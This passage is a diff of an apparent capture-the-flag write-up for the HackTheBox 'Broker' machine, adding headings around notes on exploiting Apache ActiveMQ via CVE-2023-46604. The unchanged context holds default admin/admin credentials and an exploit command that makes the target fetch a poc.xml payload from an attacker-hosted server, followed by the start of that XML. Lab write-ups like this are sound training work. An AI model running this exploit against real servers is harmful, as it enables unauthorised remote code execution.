@@ -46,6 +46,7 @@ u:admin
 
 p:admin
 
+## Identify Vulnerability
 ![](/images/Broker/2024-01-22-21-24-15.png)
 
 Broker website using `Apache ActiveMQ` . Usually Easy machine using CVE to exploit it . I found `Apache ActiveMQ` Exploit CVE github page here [CVE-2023-46604
@@ -60,6 +61,7 @@ python3 exploit.py -i http://Broker.htb -p 80 -u 10.10.10.122:8000/poc.xml
 
 file contains `poc.xml`
 
+## Running Exploit
 ```                                                                                        
 <?xml version="1.0" encoding="UTF-8" ?>
     <beans xmlns="http://www.springframework.org/schema/beans"
